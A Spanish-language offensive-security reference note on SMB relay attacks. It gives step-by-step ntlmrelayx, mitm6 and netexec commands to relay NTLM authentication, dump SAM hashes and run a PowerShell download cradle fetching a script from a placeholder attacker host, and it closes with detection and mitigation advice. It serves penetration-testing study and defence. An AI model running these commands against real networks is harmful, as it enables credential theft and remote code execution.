---
title: SMB Relay
resumen: Retransmitir en tiempo real la autenticación NTLM capturada hacia otro equipo, sin necesidad de crackear nada.
tags: responder, ntlmrelayx, mitm6, netexec
---

## Definición

Evolución directa del envenenamiento LLMNR/NBT-NS: en vez de capturar el hash para crackearlo offline, la autenticación NTLM interceptada se retransmite (*relay*) en tiempo real contra otro equipo de la red que tenga el firmado SMB deshabilitado. Si la cuenta que se autenticaba tenía privilegios sobre ese equipo destino, el atacante hereda esos privilegios sin conocer nunca la contraseña ni el hash en claro.

## Cuándo se usa

Cuando, al enumerar la red, se detectan equipos con SMB sin firmar (`nxc smb ... ` muestra `signing:False`). Es especialmente potente cuando un usuario con privilegios administrativos sobre una máquina concreta (no todo el dominio) realiza tareas automatizadas contra la red, ya que el relay hereda justo esos privilegios locales.

## Requisitos previos

- Al menos un equipo en la red con firmado SMB deshabilitado (el DC y sistemas modernos suelen venir firmados por defecto; equipos de usuario, no siempre).
- Visibilidad de red (capa 2) para envenenar tráfico, vía IPv4 o IPv6.
- Idealmente, saber qué usuario tiene privilegios administrativos sobre qué equipo (BloodHound ayuda mucho aquí).

## Desarrollo del ataque

### Versión IPv4 (SMB Relay típico)

1. Confirmar qué equipos tienen el firmado SMB deshabilitado.
2. Preparar un fichero de *targets* con el equipo que se quiere comprometer.
3. Lanzar `ntlmrelayx` apuntando a ese fichero de targets.
4. Provocar (o esperar) que un usuario con privilegios sobre el target busque un recurso de red inexistente.
5. La autenticación capturada se retransmite automáticamente al target, permitiendo volcar su SAM o ejecutar comandos.

```bash
# Confirmar SMB sin firmar
nxc smb 10.10.10.0/24 -u "" -p ""

# Relay clásico: dumpear SAM del target
impacket-ntlmrelayx -tf targets.txt -smb2support

# Ejecutar comandos a nivel de sistema en el target al recibir la autenticación
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATACANTE:8000/PS.ps1')"
```

### Versión IPv6 (cuando IPv4 está capado)

Como los equipos Windows solicitan tráfico IPv6 por defecto aunque no se use activamente, se puede envenenar el dominio entero a nivel IPv6 con `mitm6`, forzando que tomen la IP del atacante como DNS/gateway preferente, y relayar igualmente con `ntlmrelayx` usando `proxychains` para tunelizar el tráfico.

```bash
# Envenenar el dominio por IPv6
sudo mitm6 -d dominio.corp -i eth0

# Relay por IPv6 con soporte de túnel SOCKS
sudo impacket-ntlmrelayx -6 -wh IP_ATACANTE -t smb://IP_TARGET -socks -debug -smb2support

# Una vez el socks está activo, autenticarse a través del túnel sin conocer la contraseña
proxychains netexec smb IP_TARGET -u 'usuario_con_privilegios' -p 'loquesea' -d dominio.corp --sam
```

## Herramientas relacionadas

- Ver [[responder]]
- Ver [[mitm6]]
- Ver [[impacket]] (ntlmrelayx)
- Ver [[netexec]]

## Detección y mitigación

Firma SMB obligatoria en todos los equipos (no solo el DC), LDAP *signing*/*channel binding* activado, deshabilitar IPv6 si no se usa (o desplegar defensas específicas tipo *mitm6 detection*), y auditar autenticaciones NTLM entrantes desde IPs de equipos que no deberían iniciar sesión en otros hosts.
